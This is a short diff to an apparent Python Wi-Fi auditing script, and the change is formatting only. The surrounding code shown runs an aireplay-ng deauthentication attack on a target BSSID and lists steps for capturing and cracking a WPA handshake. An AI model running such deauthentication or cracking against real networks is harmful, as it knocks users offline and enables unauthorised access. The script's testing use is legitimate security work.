@@ -150,7 +150,8 @@ def deauth_attack(interface, bssid, channel):
     print(Fore.CYAN + f"[+] Performing deauthentication attack on BSSID: {bssid}...")
     try:
         subprocess.run(
-            ["aireplay-ng", "--deauth", "10", "-a", bssid, interface], check=True
+            ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
+            check=True,
         )
     except Exception as e:
         print(Fore.RED + f"[-] Failed to perform deauthentication attack: {e}")
@@ -270,7 +271,7 @@ def main():
         # Step 5: Capture handshake
         cap_file = capture_handshake(monitor_interface, TARGET_BSSID, target["Channel"])
         if not cap_file:
-            print(Fore.RED + "[-] Test failed. No handshake captured.")
+            print(Fore.RED + " [-] Test failed. No handshake captured.")
             sys.exit(1)
 
         # Step 6: Crack handshake
